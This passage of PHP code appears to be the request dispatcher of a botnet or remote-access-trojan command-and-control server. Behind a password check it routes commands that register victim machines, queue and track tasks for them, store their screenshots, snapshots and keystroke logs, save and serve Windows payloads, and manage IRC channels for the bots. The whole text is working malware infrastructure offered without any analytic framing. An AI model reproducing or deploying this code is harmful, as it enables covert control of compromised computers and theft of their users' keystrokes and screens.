					echo $IRCServers;
				}else{
					echo "empty";
				}
		
		}
	
    function __destruct()
    {
        // $this->db->close();
    }

}

if (!isset($_GET['pass'])) {
    return;
}
if (extension_loaded('pdo') && extension_loaded('pdo_mysql') && extension_loaded('pdo_sqlite')) {
$server = new SERVER();
if ($_GET['pass'] == $server->GetPasswords()) {
    if (isset($_GET['command'])) {
		if ($_GET['command'] == "GetIRCStatus") {
            $server->GetIRCStatus($_GET['id']);
        }
        if ($_GET['command'] == "get_statics") {
            $server->get_statics_data();
        }
        if ($_GET['command'] == "get_new_machines") {
            $server->get_refresh_data($_GET['timestamp']);
        }
        if ($_GET['command'] == "getGMAPMachines") {
            $server->getGMAPMachines($_GET['GmapMaxValue']);
        }
        if ($_GET['command'] == "getOnlineMachinesData") {
            $server->getOnlineMachinesData($_GET['limit'], $_GET['restrict'], $_GET['filter']);
        }
        if ($_GET['command'] == "getOfflineMachinesData") {
            $server->getOfflineMachinesData($_GET['limit'], $_GET['restrict'], $_GET['filter']);
        }
        if ($_GET['command'] == "getDisconnectedMachinesData") {
            $server->getDisconnectedMachinesData($_GET['limit'], $_GET['restrict'], $_GET['filter']);
        }
        if ($_GET['command'] == "GetTasks") {
            $server->getTasks();
        }
        if ($_GET['command'] == "getPrivateTasks") {
            $server->getPrivateTasks($_GET["id"]);
        }
        if ($_GET['command'] == "UpdateTaskStatus") {
            $server->UpdateTaskStatus($_GET["task_id"], $_GET["task_status"]);
        }
        if ($_GET['command'] == "RemoveTask") {
            $server->RemoveTask($_GET["task_id"]);
        }
        if ($_GET['command'] == "GetTasksExcu") {
            $server->GetTasksExcu($_GET["task_id"]);
        }
        if ($_GET['command'] == "AddTask") {
            $server->AddTask($_GET["task_data"]);
        }
        if ($_GET['command'] == "GetMachineIRCInfo") {
            $server->GetMachineIRCInfo($_GET["id"]);
        }
        if ($_GET['command'] == "RegisterNewMachine") {
            $server->RegisterNewMachine($_POST["machine_data"]);
        }
        if ($_GET['command'] == "UpdateNewMachine") {
            $server->UpdateNewMachine($_POST["id"], $_POST["machine_data"]);
        }
        if ($_GET['command'] == "UpdateAndGetTasks") {
            $server->UpdateAndGetTasks($_GET["machine_id"], $_GET["machine_os"], $_GET["privateip"]);
        }
        if ($_GET['command'] == "InsertTaskExecution") {
            $server->InsertTaskExecution($_GET["excuter_id"], $_GET["task_id"]);
        }
        if ($_GET['command'] == "SaveScreenShot") {
            $server->SaveScreenShot($_POST["id"], $_POST["data"]);
        }
        if ($_GET['command'] == "SaveSnapshot") {
            $server->SaveSnapshot($_POST["id"], $_POST["data"]);
        }
        if ($_GET['command'] == "GetBAse64Data") {
            $server->GetBAse64Data($_GET["machine_id"], $_GET["data_type"]);
        }
        if ($_GET['command'] == "UpdateIRCServer") {
            $server->UpdateIRCServer($_GET["id"], $_GET["server"], $_GET["port"], $_GET["nickname"], $_GET["channle"]);
        }
        if ($_GET['command'] == "GetIP") {
            $server->GetIP();
        }
        if ($_GET['command'] == "SetKeyLogs") {
            $server->SetKeyLogs($_POST["id"], $_POST["data"]);
        }
        if ($_GET['command'] == "SaveWindowsPayload") {
            $server->SaveWindowsPayload($_POST["data"]);
        }
        if ($_GET['command'] == "GetPayloads") {
            $server->GetPayloads($_GET["keys"]);
        }
        if ($_GET['command'] == "GetMachineScreenshot") {
            $server->GetMachineScreenshot($_GET["id"]);
        }
        if ($_GET['command'] == "CheckLogin") {
            $server->CheckLogin($_GET["password"]);
        }
        if ($_GET['command'] == "VerifyDatabase") {
            $server->VerifyDatabase();
        }
        if ($_GET['command'] == "UpdateHTTPIRCStatus") {
            $server->update_irc_status($_GET["machine_id"], $_GET["irc_status"]);
        }
        if ($_GET['command'] == "ChanegPassword") {
            $server->ChanegPassword($_GET["newpassword"]);
        }
        if ($_GET['command'] == "TestIfCurrentDirIsWritable") {
            $server->TestIfCurrentDirIsWritable();
        }
		if ($_GET['command'] == "GetPublicIP") {
            $server->GetPublicIP();
        }
		if ($_GET['command'] == "CheckPHPVersion") {
            $server->CheckPHPVersion();
        }
		if ($_GET['command'] == "UpdateLastContact") {
            $server->UpdateLastContact($_GET["id"]);
        }
		if ($_GET['command'] == "GetIRCServers") {
            $server->GetIRCServers($_GET["id"]);
        }
		
    }

} else {
    echo "false";
}
}else{
	echo "pdo_false";
}

?>